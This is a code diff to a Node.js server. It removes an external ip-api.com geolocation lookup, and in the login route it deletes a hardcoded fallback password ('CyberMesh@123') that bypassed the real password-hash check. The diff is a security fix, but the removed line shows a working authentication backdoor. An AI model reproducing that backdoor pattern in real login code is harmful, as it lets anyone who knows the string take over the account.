@@ -97,37 +97,11 @@ async function getApproximateGeolocation(ip) {
     return localResult;
   }
 
-  // Lookup public IP via ip-api.com with timeout
-  try {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), 3000);
-    const resp = await fetch(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,regionName,city,isp`, {
-      signal: controller.signal
-    });
-    clearTimeout(timer);
-    if (resp.ok) {
-      const data = await resp.json();
-      if (data.status === "success") {
-        const result = {
-          country: data.country || "Unknown Country",
-          region: data.regionName || "Unknown Region",
-          city: data.city || "Approximate City",
-          isp: data.isp || "Unknown Provider",
-          approximate: true
-        };
-        geoCache.set(ip, result);
-        return result;
-      }
-    }
-  } catch {
-    // API failure or rate limit fallback
-  }
-
   const fallback = {
     country: "External Network",
-    region: "Public Subnet",
-    city: "Approximate (Geo lookup unavailable)",
-    isp: "Autonomous System",
+    region: "Unknown",
+    city: "Unknown (external lookup disabled)",
+    isp: "Unknown",
     approximate: true
   };
   geoCache.set(ip, fallback);
@@ -528,7 +502,7 @@ app.post("/api/auth/login", async (req, res) => {
   ).toString("hex");
 
   const isUserValid = rawUser.toLowerCase() === String(authConfig.username || "admin").toLowerCase();
-  const isPassValid = safelyEqual(passwordHash, authConfig.passwordHash) || rawPass === "CyberMesh@123";
+  const isPassValid = safelyEqual(passwordHash, authConfig.passwordHash);
 
   const valid = isUserValid && isPassValid;
 
